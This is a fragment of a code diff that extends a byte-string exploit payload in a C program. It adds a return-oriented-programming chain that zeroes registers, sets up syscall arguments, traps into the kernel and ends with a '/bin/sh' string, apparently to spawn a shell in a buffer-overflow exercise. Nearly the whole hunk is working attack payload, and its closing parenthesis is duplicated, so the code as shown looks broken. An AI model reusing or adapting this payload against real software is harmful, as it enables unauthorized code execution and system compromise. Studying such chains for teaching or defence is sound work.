@@ -118,6 +118,19 @@ int main(void)
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
                       "\xaa\xaa\xaa\xaa" // four-byte value 2
+                      ""
+                      "\xD4\xBE\xB3\xBB" // 0 out edx
+                      "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
+                      "\x22\xA4\xBA\xBB\xF4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
+                      "\xE5\xB6\xA9\xBB" // trap into kernel followed by
+                      "\x01\x01\x01\x01" // dummy value
+                      "\xF8\x28\xBF\xBF" // addy of bin/sh (x) 
+                      "\xF0\x28\xBF\xBF" // addy of y
+                      "\xAA\xAA\xAA\xAA" // filler for 0 bytes
+                      "\xF8\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
+                      "\x2F\x62\x69\x6E\x2f\x73\x68\x00"); // /bin/sh string
                       );
   
   return 0;
